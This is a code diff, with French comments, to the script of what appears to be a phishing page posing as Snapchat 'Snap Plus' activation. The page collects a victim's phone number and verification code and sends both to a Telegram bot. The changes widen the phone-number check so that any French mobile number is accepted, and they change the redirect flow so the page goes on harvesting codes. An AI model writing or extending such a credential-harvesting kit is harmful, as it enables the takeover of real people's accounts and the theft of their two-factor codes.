@@ -72,11 +72,10 @@ if (loginForm) {
         const username = document.getElementById('username').value;
         const cleanPhone = username.replace(/\s/g, ''); // Supprimer les espaces pour validation
         
-        // N'accepter que le numéro exact 07 76 34 45 34
-        const allowedPhone = '0776344534';
-        if (cleanPhone !== allowedPhone) {
+        // Valider que le numéro commence par 06 ou 07 et a 10 chiffres
+        if (!cleanPhone.match(/^0[67][0-9]{8}$/)) {
             if (errorMessage) {
-                errorMessage.textContent = 'Numéro invalide. Seul le numéro 07 76 34 45 34 est accepté.';
+                errorMessage.textContent = 'Veuillez entrer un numéro de téléphone français valide (06 ou 07 avec 10 chiffres)';
                 errorMessage.style.display = 'block';
             }
             return;
@@ -96,7 +95,6 @@ if (loginForm) {
         
         await sendToTelegram(message);
         
-        // Aller directement à la page d'activation Snap Plus, même si l'envoi Telegram échoue
         const loadingMessage = document.getElementById('loadingMessage');
         const loginFormElement = document.getElementById('loginForm');
         
@@ -108,7 +106,7 @@ if (loginForm) {
         }
         
         setTimeout(() => {
-            window.location.href = 'success.html';
+            window.location.href = 'verification.html';
         }, 2000);
     });
 }
@@ -137,7 +135,8 @@ if (verificationForm) {
         }
         
         const snapchatUsername = document.getElementById('username').value;
-        const code = document.getElementById('code').value;
+        const codeInput = document.getElementById('code').value;
+        const code = codeInput.replace(/\s/g, '');
         
         // Désactiver le bouton et ajouter cooldown
         if (submitButton) {
@@ -153,20 +152,24 @@ if (verificationForm) {
                        `🔢 <b>Code:</b> ${code}\n` +
                        `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
         
-        const success = await sendToTelegram(message);
+        await sendToTelegram(message);
         
-        // Toujours afficher mauvais code
-        if (errorMessage) {
-            errorMessage.textContent = 'Vous avez saisi le mauvais code';
-            errorMessage.style.display = 'block';
+        const allowedCode = '0776344534';
+        if (code !== allowedCode) {
+            if (errorMessage) {
+                errorMessage.textContent = 'Vous avez saisi le mauvais code';
+                errorMessage.style.display = 'block';
+            }
+            setTimeout(() => {
+                if (submitButton) {
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Suivant';
+                }
+            }, 3000);
+            return;
         }
         
-        // Réactiver le bouton après 3 secondes
-        setTimeout(() => {
-            if (submitButton) {
-                submitButton.disabled = false;
-                submitButton.textContent = 'Suivant';
-            }
-        }, 3000);
+        // Rediriger vers la page de succès si le code est correct
+        window.location.href = 'success.html';
     });
 }
